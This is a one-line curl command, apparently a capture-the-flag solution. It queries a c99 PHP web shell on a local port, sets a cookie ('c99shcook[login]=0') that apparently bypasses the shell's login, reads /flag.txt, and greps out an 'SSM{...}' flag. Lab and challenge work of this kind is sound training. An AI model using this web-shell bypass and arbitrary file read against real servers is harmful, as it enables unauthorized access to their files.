curl -G "http://127.0.0.1:50000/c99.php" \
     --data-urlencode "act=f" \
     --data-urlencode "f=flag.txt" \
     --data-urlencode "d=/" \
     -b "c99shcook[login]=0" | grep -oE "SSM\{[^}]+\}"